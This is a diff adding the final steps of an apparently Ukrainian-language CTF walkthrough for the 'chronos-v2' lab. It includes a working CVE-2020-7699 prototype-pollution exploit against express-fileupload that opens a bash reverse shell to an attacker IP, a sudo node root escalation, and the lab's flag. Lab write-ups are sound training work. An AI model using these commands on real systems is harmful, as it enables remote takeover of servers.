@@ -107,3 +107,66 @@ chronos-v2
 В результаті знаходжу директорію /opt/chronos-v2/backend/. Переглядаємо файл package.json:
 <img width="664" height="743" alt="image" src="https://github.com/user-attachments/assets/11c51afd-0ebc-4e32-96fd-4d1dded0a12d" />
 
+В цьому файлі знаходжу модуль express-fileupload версії 1.1.7-alpha.3 з критичною вразливістю:
+-CVE-2020-7699 — Remote Code Execution через Prototype Pollution
+-CWE-400 — Uncontrolled Resource Consumption
+
+Крок 7: Ескалація привілеїв через CVE-2020-7699
+
+На атакуючій машині запускаю новий netcat listener на іншому порті:
+
+sudo ncat -l -p 8021
+
+У поточному reverse shell (порт 8021) виконуємо експлойт для CVE-2020-7699: замінюю на IP моєї VM та в port listener на 8021
+python3 -c "import requests; cmd='bash -c \"bash -i >& /dev/tcp/10.0.2.17/8021 0>&1\"'; requests.post('http://127.0.0.1:8080', files={'__proto__.outputFunctionName': (None, f\"x;process.mainModule.require('child_process').exec('{cmd}');x\")}); requests.get('http://127.0.0.1:8080')"
+
+В результаті отримую доступ
+<img width="759" height="471" alt="image" src="https://github.com/user-attachments/assets/6d066b10-4055-4165-bd81-9225938a9f94" />
+
+Крок 8: Вихід з обмеженого середовища та отримання root
+
+Оскільки у мене вже є доступ, я можу створити повноцінну інтерактивну оболонку:
+
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+В результаті отримую доступ з правами root:
+
+# whoami
+root
+<img width="1009" height="131" alt="image" src="https://github.com/user-attachments/assets/643841a3-56dd-4ad3-afbd-f6cbb20decf8" />
+
+Крок 9: Читання фінального флагу
+
+Переходжу до директорії /root/ та читаю фінальний флаг:
+
+# cat /root/root.txt
+YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
+<img width="538" height="74" alt="image" src="https://github.com/user-attachments/assets/e672148f-f28e-487d-8f1f-d3b4fdcbbe2a" />
+
+Декодую прапорець з Base64:
+
+# echo "YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK" | base64 -d
+apopse siopi mazeuoume oneira
+<img width="699" height="183" alt="image" src="https://github.com/user-attachments/assets/d5b45599-c4a1-4c3e-a78d-43dcc82c4d87" />
+<img width="1966" height="276" alt="image" src="https://github.com/user-attachments/assets/87cefe7d-c014-46a0-a2cf-91be3e599b74" />
+
+Фінальний флаг отримано! CTF завершено!
+
+Висновок
+У ході роботи було виконано такі дії:
+
+Визначено IP-адресу цільової машини та проведено сканування відкритих портів.
+
+Досліджено вебзастосунок і виявлено підозрілий HTTP-запит.
+
+Змінено заголовок User-Agent, щоб обійти серверну перевірку.
+
+Виявлено вразливість Command Injection через декодування Base58 та використано її для виконання команд.
+
+Отримано reverse shell із правами користувача www-data.
+
+Досліджено файлову систему та виявлено вразливий модуль express-fileupload.
+
+Застосовано експлойт для CVE-2020-7699 (Prototype Pollution).
+
+Отримано root-доступ і прочитано фінальний прапорець.
